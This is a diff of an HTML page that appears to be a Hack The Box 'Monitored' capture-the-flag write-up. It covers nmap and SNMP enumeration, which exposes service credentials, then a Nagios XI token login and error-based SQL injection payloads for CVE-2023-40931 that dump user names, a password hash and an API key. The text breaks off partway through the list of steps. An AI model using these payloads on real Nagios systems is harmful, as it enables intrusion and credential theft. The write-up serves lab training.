@@ -139,7 +139,7 @@
     "keywords": ["SMB","Windows"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "157"
+    "wordCount": "635"
   }]
   </script>
 
@@ -814,7 +814,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="0001-01-01T00:00:00&#43;00:00">1 January 0001</time><span class="px-2 text-primary-500">&middot;</span><span>157 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span><span class="px-2 text-primary-500">&middot;</span>
+      <time datetime="0001-01-01T00:00:00&#43;00:00">1 January 0001</time><span class="px-2 text-primary-500">&middot;</span><span>635 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 
@@ -1042,6 +1042,13 @@
         <li><a href="#http-enumeration">HTTP Enumeration</a></li>
       </ul>
     </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#getting-the-token">Getting the token</a></li>
+        <li><a href="#error-based-sql-injection">Error based SQL injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#creating-an-user">Creating an user:</a></li>
   </ul>
 </nav>
   </div>
@@ -1063,6 +1070,13 @@
         <li><a href="#http-enumeration">HTTP Enumeration</a></li>
       </ul>
     </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#getting-the-token">Getting the token</a></li>
+        <li><a href="#error-based-sql-injection">Error based SQL injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#creating-an-user">Creating an user:</a></li>
   </ul>
 </nav>
   </div>
@@ -1228,7 +1242,7 @@
     
 </h3>
 <p>Starting of with an Nmap TCP scan</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -p- -T4 10.129.230.96 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sC -sV -p- -T4 10.129.230.96 
 </span></span></code></pre></div><p><strong>Results:</strong></p>
 <p>
 
@@ -1238,7 +1252,19 @@
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="" src="image2.png.png">
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image2.png_hu_525c0b448f445b8b.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image2.png_hu_a287e76b47d6afd.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image2.png_hu_7d30ad1e04846dff.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image2.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image2.png.png">
 
   
 </figure>
@@ -1249,11 +1275,36 @@
 </span></span><span class="line"><span class="cl">port 389: ldap <span class="sb">`</span>OpenLDAP 2.2.X - 2.3.X<span class="sb">`</span>
 </span></span><span class="line"><span class="cl">Port 443: HTTP: Apache httpd 2.4.56, NagiosXI
 </span></span></code></pre></div><p>Next did a Nmap UDP Scan</p>
-<pre tabindex="0"><code>sudo nmap -sU --top-ports 100 -sV -T3 -Pn -n 10.129.230.96
-</code></pre><p>Relevant ports open:</p>
-<pre tabindex="0"><code>port 161: SNMPv1 server; net-snmp SNMPv3 server (public)
-Port 162: net-snmp; net-snmp SNMPv3 server
-</code></pre><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sU --top-ports <span class="m">100</span> -sV -T3 -Pn -n 10.129.230.96
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image3.png_hu_efefd02254b73e7f.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image3.png_hu_5a0bd3c362338a8e.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image3.png_hu_16f84d0496709e1a.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image3.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image3.png.png">
+
+  
+</figure>
+</p>
+<p>Relevant ports open:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">port 161: SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Port 162: net-snmp<span class="p">;</span> net-snmp SNMPv3 server
+</span></span></code></pre></div><hr>
 
 <h3 class="relative group">SNMP Enumeration 
     <div id="snmp-enumeration" class="anchor"></div>
@@ -1268,8 +1319,8 @@ Port 162: net-snmp; net-snmp SNMPv3 server
   href="https://github.com/Yelodash/Snmp.sh"
     target="_blank"
   >snmp.sh</a> a custom script that I made to facilitate SNMP enumeration:</p>
-<pre tabindex="0"><code>snmp.sh -t 10.129.230.96 -c public --extras 
-</code></pre><p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">snmp.sh -t 10.129.230.96 -c public --extras 
+</span></span></code></pre></div><p>
 
 
 
@@ -1277,15 +1328,27 @@ Port 162: net-snmp; net-snmp SNMPv3 server
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="" src="image5.png.png">
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image4.png_hu_c9c4d2f5aafd7501.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image4.png_hu_4cb16962a70241e6.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image4.png_hu_1b2f5bc463074e4b.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image4.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image4.png.png">
 
   
 </figure>
-``</p>
+</p>
 <p>found these credentials but was not able to login via SSH:</p>
-<pre tabindex="0"><code>user: svc
-password: XjH7VCehowpR1xZB
-</code></pre><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user: svc
+</span></span><span class="line"><span class="cl">password: XjH7VCehowpR1xZB
+</span></span></code></pre></div><hr>
 
 <h3 class="relative group">HTTP Enumeration 
     <div id="http-enumeration" class="anchor"></div>
@@ -1296,7 +1359,379 @@ password: XjH7VCehowpR1xZB
     </span>        
     
 </h3>
+<ul>
+<li>Did not find anything interesting with Gobuster or Fuff so I went directly on the website</li>
+</ul>
+<p>
 
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image5.png_hu_59ca21899bb84adc.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image5.png_hu_788000bea244f748.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image5.png_hu_94a6e86a5a4568a4.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image5.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image5.png.png">
+
+  
+</figure>
+</p>
+<p>I tried to log in with the credentials found with SNMP but it was saying that <strong>the user has been disabled or does not exist</strong></p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image6.png_hu_f24dc8792b8ce791.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image6.png_hu_4ae4b5fd146a3c8c.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image6.png_hu_1aa85a137aeded2e.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image6.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image6.png.png">
+
+  
+</figure>
+</p>
+<p>after doing some googling I found this post mentioning an insecure login to the backend using ticket authentification.</p>
+<p><a
+  href="https://support.nagios.com/forum/viewtopic.php?t=58783"
+    target="_blank"
+  >https://support.nagios.com/forum/viewtopic.php?t=58783</a></p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image7.png_hu_229f39c456728027.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image7.png_hu_f41bf34d12381426.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image7.png_hu_2578fbb887ace2bd.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image7.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image7.png.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">Exploitation 
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Getting the token 
+    <div id="getting-the-token" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#getting-the-token" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>I went on burp and intercepted the login post request andkept the same <strong>username</strong> and <strong>password</strong></p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image8.png_hu_22e328341f7c98f6.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image8.png_hu_a87b852cd29bc812.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image8.png_hu_7ef19f6523af73d7.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image8.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image8.png.png">
+
+  
+</figure>
+</p>
+<p>I sent the request and obtain a <strong>token</strong>:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="" src="image9.png.png">
+
+  
+</figure>
+</p>
+<p>then crafted an URL which includes the token, used it on my browser and succeeded to login</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">https://nagios.monitored.htb/nagiosxi/?token<span class="o">=</span>342e5b9ad2b46b9eaeb23c3c06d90b219d03214b
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    srcset="
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image10.png_hu_c720745fd6c7d37c.png  330w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image10.png_hu_fd2bbf6f5d47393.png  660w,
+      /writeups/red-team-ctfs/hack-the-box/monitored/images/image10.png_hu_107c54045fcad749.png 1280w
+    "
+    data-zoom-src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image10.png.png"
+    src="/writeups/red-team-ctfs/hack-the-box/monitored/images/image10.png.png">
+
+  
+</figure>
+</p>
+<p>looking at the bottom we finally obtained the version:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Nagios XI 5.11.0
+</span></span></code></pre></div><p>by doing some researches online I found out that there is a SQL injection vulnerability affecting this version:</p>
+<p><a
+  href="https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c"
+    target="_blank"
+  >https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c</a></p>
+
+<h3 class="relative group">Error based SQL injection 
+    <div id="error-based-sql-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#error-based-sql-injection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>CVE-2023-40931</strong></p>
+<p>intercepted the request on Burp and saw the vulnerable parameter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">action</span><span class="o">=</span>acknowledge_banner_message<span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="m">2</span>
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="" src="image11.png.png">
+
+  
+</figure>
+</p>
+<ol>
+<li>Confirming SQLi :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">VERSION</span><span class="p">()))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Error</span><span class="w"> </span><span class="p">[</span><span class="n">nagiosxi</span><span class="p">]:</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;.23-MariaDB-0+deb11u1&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="2">
+<li>Direct Schema enumeration:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SCHEMA_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="n">Subquery</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="k">more</span><span class="w"> </span><span class="k">than</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w">
+</span></span></span></code></pre></div><ol start="3">
+<li>Using group_concat() to Dump All Schemas</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">SCHEMA_NAME</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;information_schema,nagiosxi&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="4">
+<li>Use LIMIT to Dump Schema Names One by One:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SCHEMA_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;information_schema&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="5">
+<li>Repeat Full Schema Dump with clean concat:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">SCHEMA_NAME</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;information_schema,nagiosxi&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="6">
+<li>Dump Tables + Columns from the target DB:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">,</span><span class="s2">&#34;:&#34;</span><span class="p">,</span><span class="k">COLUMN_NAME</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TABLE_SCHEMA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;nagiosxi&#39;</span><span class="p">)))</span><span class="w">
+</span></span></span></code></pre></div><ol start="7">
+<li>Loop tables with LIMIT:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">,</span><span class="k">COLUMN_NAME</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TABLE_SCHEMA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;nagiosxi&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;xi_users&#39;</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w"> </span><span class="n">xi_usersuser_id</span><span class="p">,</span><span class="n">xi_usersusern</span><span class="p">...</span><span class="w">
+</span></span></span></code></pre></div><ol start="8">
+<li>Target a specific table (xi_users)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COLUMN_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TABLE_SCHEMA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;nagiosxi&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;xi_users&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;user_id&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="9">
+<li>Extract Columns One-by-One from xi_users:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w"> </span><span class="n">nagiosadmin</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w"> </span><span class="n">svc</span><span class="w">
+</span></span></span></code></pre></div><ol start="10">
+<li>Dump Row Data from xi_users:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="p">:</span><span class="w"> </span><span class="err">$</span><span class="mi">2</span><span class="n">a$10$825c1eec29c150b118fe7u</span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">action</span><span class="o">=</span><span class="n">acknowledge_banner_message</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">api_key</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xi_users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="k">Output</span><span class="w"> </span><span class="p">(</span><span class="n">truncated</span><span class="p">):</span><span class="w"> </span><span class="s1">&#39;IudGPHd9pEKiee9MkJ7ggPD89q3Yn...&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="11">
